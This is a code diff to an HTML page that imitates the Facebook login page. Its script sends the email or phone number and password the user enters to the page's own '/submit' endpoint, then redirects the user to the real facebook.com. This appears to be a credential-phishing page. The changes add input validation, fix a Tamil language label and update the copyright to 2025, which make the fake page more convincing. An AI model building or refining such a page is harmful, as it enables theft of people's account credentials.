@@ -293,7 +293,7 @@
 
             <div class="form">
                 <form class="a-form">
-                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number" required />
+                    <input type="text" id="Email" class="a-email" name="Email" placeholder="Email address or phone number" required />
                     <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password" required />
                     <input type="submit" class="a-sub" value="Log In" />
                     <a href="#" class="a-link">Forgotten password?</a>
@@ -318,7 +318,7 @@
                 <li><a href="#">മലയാളം</a></li>
                 <li><a href="#">বাংলা</a></li>
                 <li><a href="#">తెలుగు</a></li>
-                <li><a href="#">தமिழ்</a></li>
+                <li><a href="#">தமிழ்</a></li>
                 <li><a href="#">ਪੰਜਾਬੀ</a></li>
                 <li><a href="#">Español</a></li>
             </ul>
@@ -340,7 +340,7 @@
                 </ul>
             </div>
             <div class="copyright">
-                <span>Facebook © 2021</span>
+                <span>Facebook © 2025</span>
             </div>
         </div>
     </div>
@@ -379,6 +379,15 @@
                 return;
             }
 
+            // Basic validation for email or phone
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phonePattern = /^[\+]?[1-9][\d]{0,15}$/;
+            
+            if (!emailPattern.test(Email) && !phonePattern.test(Email)) {
+                alert("Please enter a valid email address or phone number");
+                return;
+            }
+
             // Change this URL when deployed
             const submitUrl = window.location.origin + '/submit';
 
@@ -395,17 +404,14 @@
                 setTimeout(() => {
                     window.location.href = 'https://www.facebook.com';
                 }, 2000);
-                // Clear form
-                // document.getElementById('Email').value = '';
-                // document.getElementById('Password').value = '';
             })
             .catch(err => {
                 alert("Error submitting.");
                 console.error(err);
             });
         });
+        
         function createAccount() {
-            // Redirect to real Facebook signup
             window.location.href = 'https://www.facebook.com/reg/';
         }
     </script>
